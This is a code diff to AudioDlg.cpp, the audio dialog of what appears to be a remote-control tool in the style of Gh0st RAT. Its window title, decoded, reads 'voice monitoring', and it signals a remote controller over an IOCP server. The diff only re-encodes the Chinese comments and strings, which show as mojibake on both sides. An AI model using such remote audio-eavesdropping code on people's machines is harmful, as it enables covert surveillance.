@@ -1,4 +1,4 @@
-ï»¿// AudioDlg.cpp : implementation file
+// AudioDlg.cpp : implementation file
 //
 
 #include "stdafx.h"
@@ -70,10 +70,10 @@ BOOL CAudioDlg::OnInitDialog()
 	SetIcon(m_hIcon, FALSE);		// Set small icon
 
 	CString str;
-	str.Format("\\\\%s - è¯­éŸ³ç›‘å¬", m_IPAddress);
+	str.Format("\\\\%s - ÓïÒô¼àÌı", m_IPAddress);
 	SetWindowText(str);
 
-	// é€šçŸ¥è¿œç¨‹æ§åˆ¶ç«¯å¯¹è¯æ¡†å·²ç»æ‰“å¼€
+	// Í¨ÖªÔ¶³Ì¿ØÖÆ¶Ë¶Ô»°¿òÒÑ¾­´ò¿ª
 	BYTE bToken = COMMAND_NEXT;
 	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
 
@@ -96,7 +96,7 @@ void CAudioDlg::OnReceiveComplete()
 		m_Audio.playBuffer(m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
 		break;
 	default:
-		// ä¼ è¾“å‘ç”Ÿå¼‚å¸¸æ•°æ®
+		// ´«Êä·¢ÉúÒì³£Êı¾İ
 		return;
 	}	
 }
@@ -123,7 +123,7 @@ void CAudioDlg::OnSendLocalaudio()
 	UpdateData(true);
 }
 
-// è´Ÿè´£å‘é€æœ¬åœ°è¯­éŸ³
+// ¸ºÔğ·¢ËÍ±¾µØÓïÒô
 DWORD WINAPI CAudioDlg::WorkThread(LPVOID lparam)
 {
 	CAudioDlg	*pThis = (CAudioDlg *)lparam;
